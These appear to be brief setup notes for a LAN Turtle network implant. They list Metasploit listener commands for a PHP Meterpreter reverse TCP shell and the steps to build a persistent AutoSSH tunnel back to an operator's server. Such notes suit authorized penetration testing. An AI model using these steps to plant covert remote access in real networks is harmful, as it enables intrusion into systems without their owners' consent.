

Network config: 

    /etc/config/network



Module locations:

    /etc/turtle/modules

 to start a module from here: ./<module> start
 
 
 
## Modules


### Meterpreter reverse shell

Setting up listener
 
    msfconsole

    use exploit/multi/handler

    set PAYLOAD php/meterpreter/reverse_tcp

    set LPORT/LHOST
    set ExitOnSession false
    exploit -j

 Set up LAN Turtle

 Configure meterpreter-http with the correct IP and Port.
 
### AutoSSH
  
  Modules: autossh and keymanager
  
  Require VM with SSH server. 
  
    
  On the server create user to run the connection
  
       adduser turtle
       
       systemctl start ssh.service
  
   Use keymanager to generate keys and send the key to the server. (will be under /root/.ssh)
   
    Host: IP of SSH server
    Port: Listening port of SSH server
    User: user that was just created on server
    
  
  
  
  
  
  
  
  
  
  
 